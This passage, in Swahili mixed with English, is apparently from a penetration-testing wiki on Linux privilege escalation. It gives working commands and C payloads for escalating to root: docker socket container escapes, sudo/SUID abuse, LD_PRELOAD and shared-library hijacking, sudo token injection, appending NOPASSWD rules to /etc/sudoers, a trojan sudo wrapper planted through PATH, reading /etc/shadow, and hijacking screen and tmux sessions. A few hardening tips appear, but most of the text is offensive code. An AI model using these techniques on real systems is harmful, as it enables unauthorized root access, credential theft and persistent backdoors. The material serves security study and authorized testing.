Katika matukio ambapo Docker CLI haipatikani, docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **Orodhesha Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Unda Container:** Tuma ombi la kuunda container inayofunga (mount) root directory ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoundwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Unganisha na Container:** Tumia `socat` kuanzisha muunganisho na container, ikikuruhusu kutekeleza amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kuendesha amri moja kwa moja ndani ya container ukiwa na upatikanaji wa root kwa filesystem ya host.

### Mengine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoka ndani ya docker au kuikitumia kwa uharibifu ili escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa utagundua kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia kupata escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa utagundua kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia kupata escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa hali ya juu wa inter-Process Communication (IPC) unaowawezesha programu kuingiliana kwa ufanisi na kushirikiana data. Imeundwa kwa kuzingatia mfumo wa kisasa wa Linux, inatoa mfumo imara kwa aina mbalimbali za mawasiliano ya programu.

Mfumo ni mwingiliano, ukisaidia IPC ya msingi inayoboreshwa kwa kubadilishana data kati ya processes, ikifanana na UNIX domain sockets zilizoimarishwa. Zaidi ya hayo, husaidia kutangaza matukio au signals, na hivyo kuendeleza uunganishaji mzuri kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kusababisha player wa muziki kutulia, ikiboresha uzoefu wa mtumiaji. Aidha, D-Bus inaunga mkono mfumo wa remote objects, ukorahisisha maombi ya huduma na invoke za methods kati ya programu, na kurahisisha mchakato ulio kuwa mgumu hapo awali.

D-Bus inafanya kazi kwa mtindo wa allow/deny, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kwa msingi wa athari ya jumla ya sheria za sera zinazofanana. Sera hizi zinaeleza mwingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia unyonyaji wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na user au group zilizobainishwa zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wote wasiofunikwa na sera nyingine maalum.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila mara ku-enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Daima angalia network services zinazoendesha kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuipata:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, huenda ukaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Angalia **wewe ni nani**, ni **idhini** gani unazo, ni **watumiaji** gani wako kwenye mifumo, ni yapi wanaweza **login** na ni yapi wana **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathirika na mdudu unaowawezesha watumiaji wenye **UID > INT_MAX** kuinua mamlaka. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kundi fulani** ambacho kinaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia ikiwa kuna kitu chochote cha kuvutia kilichomo ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nenosiri zinazojulikana

Kama unajua **nenosiri yoyote** ya mazingira **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hukujali kuhusu kusababisha kelele nyingi na binaries `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameta `-a` pia inajaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa unagundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa na uwezo wa kuinua ruhusa kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri ambayo itatekelezwa na mtumiaji mwingine (root ideally) na ambayo **haitapakiwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua neno la siri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key katika root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Agizo hili linamruhusu mtumiaji **set an environment variable** wakati wa kuendesha kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzishwa kwa Bash isiyo ya kuingiliana ili kuendesha msimbo wowote kama root unapoitisha amri inayoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo za kuingiliana, Bash hutathmini `$BASH_ENV` na kusoma faili hiyo kabla ya kuendesha script lengwa. Sera nyingi za sudo zinaruhusu kuendesha script au wrapper ya shell. Ikiwa `BASH_ENV` inahifadhiwa na sudo, faili yako inasomewa kwa ruhusa za root.

- Mahitaji:
- Sheria ya sudo unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` kwa njia isiyo ya kuingiliana, au script yoyote ya bash).
- `BASH_ENV` iwepo katika `env_keep` (angalia kwa kutumia `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha usalama:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, pendelea `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Fikiria sudo I/O logging na alerting wakati preserved env vars zinapotumika.

### Njia za kuvuka utekelezaji wa sudo

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila kutaja njia ya amri

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kutaja njia**: _hacker10 ALL= (root) less_ unaweza kui-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inaendesha amri nyingine bila kutaja njia yake (daima angalia kwa kutumia** _**strings**_ **maudhui ya binary ya SUID isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa binary ya **suid** **inaendesha amri nyingine ikibainisha njia**, basi unaweza kujaribu **export a function** iitwayo kwa jina la amri ambayo faili ya suid inaitisha.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ lazima ujaribu kuunda function na ku-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha suid binary, kazi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwa executables zenye **suid/sgid**, mfumo unatekeleza masharti fulani:

- loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zilizoko katika njia za kawaida ambazo pia ni suid/sgid pekee ndizo zinazopakiwa mapema.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Usanidi huu unaruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambulika hata pale amri zinapotekelezwa kwa `sudo`, na hivyo kuna uwezekano wa kusababisha utekelezaji wa arbitrary code kwa hadhi zilizoongezwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** wakati wa kuendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH**, kwa sababu anadhibiti path ambapo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wakati unakutana na binary yenye ruhusa za **SUID** zinazojionyesha kuwa zisizo za kawaida, ni desturi nzuri kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

To exploit this, mtu angeendelea kwa kuunda faili ya C, kwa mfano _"/path/to/.config/libcalc.c"_, linalojumuisha msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Kodi hii, mara tu itakapokusanywa na kutekelezwa, inalenga kuinua vibali kwa kubadilisha ruhusa za faili na kuendesha shell yenye vibali vilivyoongezeka.

Kusanya faili la C lililotajwa hapo juu kuwa shared object (.so) kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha binary ya SUID iliyoathirika kunapaswa kuamsha exploit, kuruhusu uwezekano wa kudhoofika kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeona SUID binary inayopakia library kutoka kwa folder ambapo tunaweza kuandika, hebu tuunde library katika folder hiyo na jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata hitilafu kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Hii inamaanisha kuwa maktaba uliyotengeneza inahitaji kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji kuvuka vizingiti vya usalama vya local. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza vigezo tu** katika amri.

Mradi huu hukusanya functions halali za Unix binaries ambazo zinaweza kutumiwa kwa mabaya kuibuka kwenye restricted shells, kuongeza au kudumisha elevated privileges, kuhamisha files, kuanzisha bind na reverse shells, na kuwezesha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Kutumia tena Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default hiyo ndiyo muda wa sudo token inayo-ruhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuwa na uwezo wa ku-upload)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root na kuwa na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) itaendelea na **kuunda sudoers file** ambayo inafanya **sudo tokens kuwa ya milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/<Username>

Ikiwa una **write permissions** katika folder au kwenye faili yoyote zilizoundwa ndani ya folder, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **create a sudo token for a user and PID**.\
Kwa mfano, ikiwa unaweza overwrite faili _/var/run/sudo/ts/sampleuser_ na una shell kama user huyo mwenye PID 1234, unaweza **obtain sudo privileges** bila kuhitaji kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizoko ndani ya `/etc/sudoers.d` zinaweka ni nani anayeweza kutumia `sudo` na jinsi. Faili hizi **kwa chaguo-msingi zinaweza kusomeka tu na mtumiaji root na kundi root**.\  
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utakuwa na uwezo wa **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa `sudo` binary kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida hujiunga na mashine na hutumia `sudo`** kupanua ruhusa na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itaendesha nambari yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza njia mpya katika .bash_profile) ili wakati mtumiaji atakapotekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitajika kubadilisha faili nyingine ili kuongeza njia mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Tazama **how to exploit this misconfiguration** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib kwenye `/var/tmp/flag15/` itatumiwa na programu mahali hapa kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities zinatoa **tanzu ndogo ya vibali vya root vinavyopatikana kwa mchakato**. Hii inavunja kwa ufanisi vibali vya root kuwa **vitengo vidogo na vinavyotofautiana**. Kila kimoja kati ya vitengo hivi kinaweza kutolewa kwa uhuru kwa mchakato. Kwa njia hii seti kamili ya vibali inapunguzwa, kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu uwezo na jinsi ya kuvitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit kwa ajili ya "execute"** ina maana kwamba mtumiaji aliyeguswa anaweza "**cd**" ndani ya saraka.\
Bit ya **"read"** inaonyesha mtumiaji anaweza **list** **files**, na bit ya **"write"** inaonyesha mtumiaji anaweza **delete** na **create** **files** mpya.

## ACLs

Access Control Lists (ACLs) ni safu ya pili ya ruhusa za hiari, zenye uwezo wa **kupindua ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti wa ufikiaji wa file au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao sio wamiliki au sehemu ya kundi. Kiwango hiki cha **undani kinahakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" read na write permissions juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACL maalum kutoka kwa mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell session** za mtumiaji mwingine (**root**).\
Katika **matoleo mapya zaidi** utaweza **connect** tu kwa screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hili lilikuwa tatizo na **matoleo ya zamani ya tmux**. Sikuweza kuteka kikao cha tmux (v2.1) kilichotengenezwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo zenye msingi wa Debian (Ubuntu, Kubuntu, etc) kati ya Septemba 2006 na 13 Mei, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii hutokea wakati wa kuunda ssh key mpya kwenye OS hizo, kwani **matoleo yalikuwa 32,768 tu**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Thamani za kusanidi zenye kuvutia

- **PasswordAuthentication:** Inaelezea kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaelezea kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaporuhusiwa, inaelezea kama server inaruhusu kuingia kwa akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaelezea kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa njia ya private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa private key pekee na ikiwa options za commands zimeainishwa
- `no` : hapana

### AuthorizedKeysFile

Inaelezea faili zinazoonyesha public keys zinazoweza kutumika kwa authentication ya mtumiaji. Inaweza kuwa na tokens kama `%h`, ambazo zitatumika kubadilishwa na directory ya nyumbani. **Unaweza kuonyesha absolute paths** (zinaanza kwa `/`) au **relative paths kutoka kwenye home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
